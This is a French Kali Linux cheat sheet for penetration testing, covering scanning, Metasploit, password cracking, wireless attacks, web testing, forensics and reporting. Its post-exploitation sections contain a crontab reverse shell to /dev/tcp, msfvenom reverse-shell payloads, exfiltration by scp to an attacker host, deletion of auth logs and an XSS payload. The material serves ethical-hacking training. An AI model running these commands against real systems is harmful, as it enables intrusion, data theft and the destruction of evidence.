---
title: 'Fiche Mémo Kali Linux'
description: 'Maîtrisez Kali Linux avec notre fiche mémo complète couvrant les commandes essentielles, les concepts et les meilleures pratiques.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Feuille de triche Kali Linux
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/fr/learn/kali">Apprenez Kali Linux avec des Labs Pratiques</a>
</base-disclaimer-title>
<base-disclaimer-content>
Apprenez les tests d'intrusion Kali Linux grâce à des laboratoires pratiques et des scénarios du monde réel. LabEx propose des cours complets sur Kali Linux couvrant les commandes essentielles, la numérisation de réseau, l'évaluation des vulnérabilités, les attaques par mot de passe, les tests d'applications web et la criminalistique numérique. Maîtrisez les techniques de hacking éthique et les outils d'audit de sécurité.
</base-disclaimer-content>
</base-disclaimer>

## Configuration et Configuration du Système

### Configuration Initiale : `sudo apt update`

Mettre à jour les paquets et les dépôts système pour des performances optimales.

```bash
# Mettre à jour le dépôt de paquets
sudo apt update
# Mettre à niveau les paquets installés
sudo apt upgrade
# Mise à niveau complète du système
sudo apt full-upgrade
# Installer les outils essentiels
sudo apt install curl wget git
```

### Gestion des Utilisateurs : `sudo useradd`

Créer et gérer des comptes utilisateurs pour les tests de sécurité.

```bash
# Ajouter un nouvel utilisateur
sudo useradd -m username
# Définir le mot de passe
sudo passwd username
# Ajouter l'utilisateur au groupe sudo
sudo usermod -aG sudo username
# Changer d'utilisateur
su - username
```

### Gestion des Services : `systemctl`

Contrôler les services et les démons système pour les scénarios de test.

```bash
# Démarrer le service
sudo systemctl start apache2
# Arrêter le service
sudo systemctl stop apache2
# Activer le service au démarrage
sudo systemctl enable ssh
# Vérifier l'état du service
sudo systemctl status postgresql
```

### Configuration Réseau : `ifconfig`

Configurer les interfaces réseau pour les tests d'intrusion.

```bash
# Afficher les interfaces réseau
ifconfig
# Configurer l'adresse IP
sudo ifconfig eth0 192.168.1.100
# Mettre l'interface en marche/arrêt
sudo ifconfig eth0 up
# Configurer l'interface sans fil
sudo ifconfig wlan0 up
```

### Variables d'Environnement : `export`

Configurer les variables d'environnement et les chemins du système de test.

```bash
# Définir l'IP cible
export TARGET=192.168.1.1
# Définir le chemin de la liste de mots
export WORDLIST=/usr/share/wordlists/rockyou.txt
# Voir les variables d'environnement
env | grep TARGET
```

### Installation d'Outils : `apt install`

Installer des outils de sécurité et des dépendances supplémentaires.

```bash
# Installer des outils supplémentaires
sudo apt install nmap wireshark burpsuite
# Installer depuis GitHub
git clone https://github.com/tool/repo.git
# Installer des outils Python
pip3 install --user tool-name
```

## Découverte et Balayage Réseau

### Découverte d'Hôtes : `nmap -sn`

Identifier les hôtes actifs sur le réseau à l'aide de balayages ping.

```bash
# Balayage Ping
nmap -sn 192.168.1.0/24
# Balayage ARP (réseau local)
nmap -PR 192.168.1.0/24
# Balayage d'écho ICMP
nmap -PE 192.168.1.0/24
# Découverte rapide d'hôtes
masscan --ping 192.168.1.0/24
```

### Balayage de Ports : `nmap`

Scanner les ports ouverts et les services en cours d'exécution sur les systèmes cibles.

```bash
# Balayage TCP de base
nmap 192.168.1.1
# Balayage agressif
nmap -A 192.168.1.1
# Balayage UDP
nmap -sU 192.168.1.1
# Balayage SYN furtif
nmap -sS 192.168.1.1
```

### Énumération de Services : `nmap -sV`

Identifier les versions de services et les vulnérabilités potentielles.

```bash
# Détection de version
nmap -sV 192.168.1.1
# Détection d'OS
nmap -O 192.168.1.1
# Balayage de scripts
nmap -sC 192.168.1.1
# Balayage complet
nmap -sS -sV -O -A 192.168.1.1
```

## Collecte d'Informations et Reconnaissance

### Énumération DNS : `dig`

Recueillir des informations DNS et effectuer des transferts de zone.

```bash
# Recherche DNS de base
dig example.com
# Recherche DNS inversée
dig -x 192.168.1.1
# Tentative de transfert de zone
dig @ns1.example.com example.com axfr
# Énumération DNS
dnsrecon -d example.com
```

### Reconnaissance Web : `dirb`

Découvrir des répertoires et des fichiers cachés sur les serveurs web.

```bash
# Force brute de répertoires
dirb http://192.168.1.1
# Liste de mots personnalisée
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Alternative Gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Informations WHOIS : `whois`

Recueillir des informations sur l'enregistrement et la propriété de domaines.

```bash
# Recherche WHOIS
whois example.com
# WHOIS IP
whois 8.8.8.8
# Collecte d'informations complète
theharvester -d example.com -l 100 -b google
```

### Analyse SSL/TLS : `sslscan`

Analyser la configuration SSL/TLS et les vulnérabilités.

```bash
# Balayage SSL
sslscan 192.168.1.1:443
# Analyse complète testssl.sh
testssl.sh https://example.com
# Informations sur le certificat SSL
openssl s_client -connect example.com:443
```

### Énumération SMB : `enum4linux`

Énumérer les partages SMB et les informations NetBIOS.

```bash
# Énumération SMB
enum4linux 192.168.1.1
# Lister les partages SMB
smbclient -L //192.168.1.1
# Se connecter au partage
smbclient //192.168.1.1/share
# Balayage de vulnérabilités SMB
nmap --script smb-vuln* 192.168.1.1
```

### Énumération SNMP : `snmpwalk`

Recueillir des informations système via le protocole SNMP.

```bash
# SNMP walk
snmpwalk -c public -v1 192.168.1.1
# Vérification SNMP
onesixtyone -c community.txt 192.168.1.1
# Énumération SNMP
snmp-check 192.168.1.1
```

## Analyse des Vulnérabilités et Exploitation

### Balayage de Vulnérabilités : `nessus`

Identifier les vulnérabilités de sécurité à l'aide de scanners automatisés.

```bash
# Démarrer le service Nessus
sudo systemctl start nessusd
# Lancer le scan OpenVAS
openvas-start
# Scanner de vulnérabilités web Nikto
nikto -h http://192.168.1.1
# SQLmap pour l'injection SQL
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit Framework : `msfconsole`

Lancer des exploits et gérer des campagnes de tests d'intrusion.

```bash
# Démarrer Metasploit
msfconsole
# Rechercher des exploits
search ms17-010
# Utiliser l'exploit
use exploit/windows/smb/ms17_010_eternalblue
# Définir l'hôte cible
set RHOSTS 192.168.1.1
```

### Test de Dépassement de Tampon : `pattern_create`

Générer des motifs pour l'exploitation de dépassement de tampon.

```bash
# Créer un motif
pattern_create.rb -l 400
# Trouver le décalage
pattern_offset.rb -l 400 -q EIP_value
```

### Développement d'Exploits Personnalisés : `msfvenom`

Créer des charges utiles personnalisées pour des cibles spécifiques.

```bash
# Générer du shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Shell inversé Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Shell inversé Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## Attaques par Mot de Passe et Tests d'Accréditation

### Attaques par Force Brute : `hydra`

Effectuer des attaques par force brute de connexion contre divers services.

```bash
# Force brute SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# Force brute de formulaire HTTP
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# Force brute FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### Crackage de Hachages : `hashcat`

Craquer des hachages de mots de passe à l'aide de l'accélération GPU.

```bash
# Crackage de hachage MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crackage de hachage NTLM
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# Générer des variations de liste de mots
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper : `john`

Crackage de mots de passe traditionnel avec divers modes d'attaque.

```bash
# Craquer le fichier de mots de passe
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Afficher les mots de passe craqués
john --show shadow.txt
# Mode incrémental
john --incremental shadow.txt
# Règles personnalisées
john --rules --wordlist=passwords.txt shadow.txt
```

### Génération de Listes de Mots : `crunch`

Créer des listes de mots personnalisées pour des attaques ciblées.

```bash
# Générer une liste de mots de 4 à 8 caractères
crunch 4 8 -o wordlist.txt
# Jeu de caractères personnalisé
crunch 6 6 -t admin@ -o passwords.txt
# Génération basée sur un modèle
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## Tests de Sécurité des Réseaux Sans Fil

### Configuration du Mode Moniteur : `airmon-ng`

Configurer l'adaptateur sans fil pour la capture de paquets et l'injection.

```bash
# Activer le mode moniteur
sudo airmon-ng start wlan0
# Vérifier les processus interférents
sudo airmon-ng check kill
# Arrêter le mode moniteur
sudo airmon-ng stop wlan0mon
```

### Découverte de Réseau : `airodump-ng`

Découvrir et surveiller les réseaux sans fil et les clients.

```bash
# Scanner tous les réseaux
sudo airodump-ng wlan0mon
# Cibler un réseau spécifique
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Afficher uniquement les réseaux WEP
sudo airodump-ng --encrypt WEP wlan0mon
```

### Attaques WPA/WPA2 : `aircrack-ng`

Effectuer des attaques contre les réseaux chiffrés WPA/WPA2.

```bash
# Attaque de désauthentification
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Craquer la poignée de main capturée
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Attaque WPS avec Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Attaque de Jumeau Malveillant : `hostapd`

Créer des points d'accès pirates pour la récolte d'informations d'identification.

```bash
# Démarrer l'AP pirate
sudo hostapd hostapd.conf
# Service DHCP
sudo dnsmasq -C dnsmasq.conf
# Capturer les informations d'identification
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Tests de Sécurité des Applications Web

### Test d'Injection SQL : `sqlmap`

Détection et exploitation automatisées des injections SQL.

```bash
# Test d'injection SQL de base
sqlmap -u "http://example.com/page.php?id=1"
# Tester les paramètres POST
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# Extraire la base de données
sqlmap -u "http://example.com/page.php?id=1" --dbs
# Vider une table spécifique
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Cross-Site Scripting : `xsser`

Tester les vulnérabilités XSS dans les applications web.

```bash
# Test XSS
xsser --url "http://example.com/search.php?q=XSS"
# Détection XSS automatisée
xsser -u "http://example.com" --crawl=10
# Charge utile personnalisée
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Intégration Burp Suite : `burpsuite`

Plateforme complète de tests de sécurité des applications web.

```bash
# Démarrer Burp Suite
burpsuite
# Configurer le proxy (127.0.0.1:8080)
# Configurer le navigateur proxy pour capturer le trafic
# Utiliser Intruder pour les attaques automatisées
# Spider pour la découverte de contenu
```

### Traversal de Répertoire : `wfuzz`

Tester les vulnérabilités d'inclusion de fichiers et de traversal de répertoire.

```bash
# Fuzzing de répertoire
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# Fuzzing de paramètre
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## Post-Exploitation et Escalade de Privilèges

### Énumération du Système : `linpeas`

Énumération automatisée de l'escalade de privilèges pour les systèmes Linux.

```bash
# Télécharger LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# Rendre exécutable
chmod +x linpeas.sh
# Exécuter l'énumération
./linpeas.sh
# Alternative Windows : winPEAS.exe
```

### Mécanismes de Persistance : `crontab`

Établir la persistance sur les systèmes compromis.

```bash
# Modifier crontab
crontab -e
# Ajouter un shell inversé
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# Persistance de clé SSH
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Exfiltration de Données : `scp`

Transférer des données de manière sécurisée depuis des systèmes compromis.

```bash
# Copier un fichier vers la machine de l'attaquant
scp file.txt user@192.168.1.100:/tmp/
# Compresser et transférer
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# Exfiltration HTTP
python3 -m http.server 8000
```

### Couvrir ses Traces : `history`

Supprimer les preuves des activités sur les systèmes compromis.

```bash
# Effacer l'historique bash
history -c
unset HISTFILE
# Effacer des entrées spécifiques
history -d line_number
# Effacer les journaux système
sudo rm /var/log/auth.log*
```

## Criminalistique Numérique et Analyse

### Imagerie de Disque : `dd`

Créer des images forensiques des périphériques de stockage.

```bash
# Créer une image disque
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# Vérifier l'intégrité de l'image
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# Monter l'image
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### Récupération de Fichiers : `foremost`

Récupérer des fichiers supprimés à partir d'images disque ou de lecteurs.

```bash
# Récupérer des fichiers à partir de l'image
foremost -i evidence.img -o recovered/
# Types de fichiers spécifiques
foremost -t jpg,png,pdf -i evidence.img -o photos/
# Alternative PhotoRec
photorec evidence.img
```

### Analyse de Mémoire : `volatility`

Analyser les vidages de RAM pour des preuves forensiques.

```bash
# Identifier le profil OS
volatility -f memory.dump imageinfo
# Lister les processus
volatility -f memory.dump --profile=Win7SP1x64 pslist
# Extraire un processus
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### Analyse de Paquets Réseau : `wireshark`

Analyser les captures de trafic réseau pour des preuves forensiques.

```bash
# Démarrer Wireshark
wireshark
# Analyse en ligne de commande
tshark -r capture.pcap -Y "http.request.method==GET"
# Extraire des fichiers
foremost -i capture.pcap -o extracted/
```

## Génération de Rapports et Documentation

### Capture d'Écran : `gnome-screenshot`

Documenter les découvertes avec une capture d'écran systématique.

```bash
# Capture d'écran complète
gnome-screenshot -f screenshot.png
# Capture de fenêtre
gnome-screenshot -w -f window.png
# Capture différée
gnome-screenshot -d 5 -f delayed.png
# Sélection de zone
gnome-screenshot -a -f area.png
```

### Gestion des Journaux : `script`

Enregistrer les sessions de terminal à des fins de documentation.

```bash
# Démarrer l'enregistrement de session
script session.log
# Enregistrer avec chronométrage
script -T session.time session.log
# Rejouer la session
scriptreplay session.time session.log
```

### Modèles de Rapport : `reportlab`

Générer des rapports de tests d'intrusion professionnels.

```bash
# Installer les outils de rapport
pip3 install reportlab
# Générer un rapport PDF
python3 generate_report.py
# Markdown vers PDF
pandoc report.md -o report.pdf
```

### Intégrité des Preuves : `sha256sum`

Maintenir la chaîne de possession avec des hachages cryptographiques.

```bash
# Générer des sommes de contrôle
sha256sum evidence.img > evidence.sha256
# Vérifier l'intégrité
sha256sum -c evidence.sha256
# Sommes de contrôle de fichiers multiples
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## Maintenance et Optimisation du Système

### Gestion des Paquets : `apt`

Maintenir et mettre à jour les paquets système et les outils de sécurité.

```bash
# Mettre à jour les listes de paquets
sudo apt update
# Mettre à niveau tous les paquets
sudo apt upgrade
# Installer un outil spécifique
sudo apt install tool-name
# Supprimer les paquets inutilisés
sudo apt autoremove
```

### Mises à Jour du Noyau : `uname`

Surveiller et mettre à jour le noyau du système pour les correctifs de sécurité.

```bash
# Vérifier le noyau actuel
uname -r
# Lister les noyaux disponibles
apt list --upgradable | grep linux-image
# Installer un nouveau noyau
sudo apt install linux-image-generic
# Supprimer les anciens noyaux
sudo apt autoremove --purge
```

### Vérification des Outils : `which`

Vérifier les installations d'outils et localiser les exécutables.

```bash
# Localiser un outil
which nmap
# Vérifier si l'outil existe
command -v metasploit
# Lister tous les outils dans le répertoire
ls /usr/bin/ | grep -i security
```

### Surveillance des Ressources : `htop`

Surveiller les ressources système lors de tests de sécurité intensifs.

```bash
# Visionneuse de processus interactive
htop
# Utilisation de la mémoire
free -h
# Utilisation du disque
df -h
# Connexions réseau
netstat -tulnp
```

## Raccourcis et Alias Essentiels de Kali Linux

### Créer des Alias : `.bashrc`

Configurer des raccourcis de commande pour gagner du temps lors des tâches fréquentes.

```bash
# Modifier bashrc
nano ~/.bashrc
# Ajouter des alias utiles
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# Recharger bashrc
source ~/.bashrc
```

### Fonctions Personnalisées : `function`

Créer des combinaisons de commandes avancées pour les flux de travail courants.

```bash
# Fonction de scan nmap rapide
function qscan() {
    nmap -sS -sV -O $1
}
# Configuration de la configuration des tests d'intrusion
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### Raccourcis Clavier : Terminal

Maîtriser les raccourcis clavier essentiels pour une navigation plus rapide.

```bash
# Raccourcis du terminal
# Ctrl+C - Tuer la commande actuelle
# Ctrl+Z - Suspendre la commande actuelle
# Ctrl+L - Effacer l'écran
# Ctrl+R - Rechercher dans l'historique des commandes
# Tab - Complétion automatique des commandes
# Haut/Bas - Naviguer dans l'historique des commandes
```

### Configuration de l'Environnement : `tmux`

Configurer des sessions de terminal persistantes pour les tâches de longue durée.

```bash
# Démarrer une nouvelle session
tmux new-session -s pentest
# Détacher la session
# Ctrl+B, D
# Lister les sessions
tmux list-sessions
# Attacher à la session
tmux attach -t pentest
```

## Liens Pertinents

- <router-link to="/linux">Feuille de triche Linux</router-link>
- <router-link to="/shell">Feuille de triche Shell</router-link>
- <router-link to="/cybersecurity">Feuille de triche Cybersécurité</router-link>
- <router-link to="/nmap">Feuille de triche Nmap</router-link>
- <router-link to="/wireshark">Feuille de triche Wireshark</router-link>
- <router-link to="/hydra">Feuille de triche Hydra</router-link>
- <router-link to="/devops">Feuille de triche DevOps</router-link>
- <router-link to="/docker">Feuille de triche Docker</router-link>
